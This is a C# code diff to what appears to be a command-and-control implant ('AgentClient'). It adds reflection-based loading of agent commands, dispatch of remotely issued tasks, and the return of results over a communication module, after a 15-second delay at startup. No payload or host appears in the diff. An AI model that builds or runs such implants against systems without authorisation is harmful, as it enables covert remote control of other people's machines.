@@ -3,22 +3,27 @@ using AgentClient.Domain.Models.Agents;
 using System.Diagnostics;
 using System.Security.Principal;
 using System.ComponentModel.DataAnnotations;
+using AgentClient.Application.Commands;
+using System.Reflection;
 
 namespace AgentClient
 {
     public class Program
     {
-        // TODO: single agent field instance
+        // TODO: single agent instance across app
         private static Agent _agent;
         private static AgentMetadata _metadata;
         private static CommModule _commModule;
         private static CancellationTokenSource _tokenSource;
+
+        private static List<AgentCommand> _commands = new();
 
         static void Main(string[] args)
         {
             Thread.Sleep(15000);
 
             GenerateMetadata();
+            LoadAgentCommands();
 
             _agent = new Agent(_metadata);
 
@@ -48,12 +53,41 @@ namespace AgentClient
 
         private static void HandleTask(AgentTask task)
         {
+            var command = _commands.FirstOrDefault(c => c.Name == task.Command);
+            if (command == null) throw new KeyNotFoundException("Invalid command.");
 
+            var result = command.Execute(task);
+            SendTaskResult(task.Id, result);
         }
 
-        public Task Stop()
+        private static void SendTaskResult(Guid taskId, string result)
+        {
+            var taskResult = new AgentTaskResult
+            {
+                Id = taskId,
+                Result = result
+            };
+
+            _commModule.SendData(taskResult);
+        }
+
+        public static Task Stop()
         {
             return Task.FromCanceled(_tokenSource.Token);
+        }
+
+        private static void LoadAgentCommands()
+        {
+            var self = Assembly.GetExecutingAssembly();
+
+            foreach (var type in self.GetTypes())
+            {
+                if (type.IsSubclassOf(typeof(AgentCommand)))
+                {
+                    var instance = (AgentCommand)Activator.CreateInstance(type);
+                    _commands.Add(instance);
+                }
+            }
         }
 
         static void GenerateMetadata()
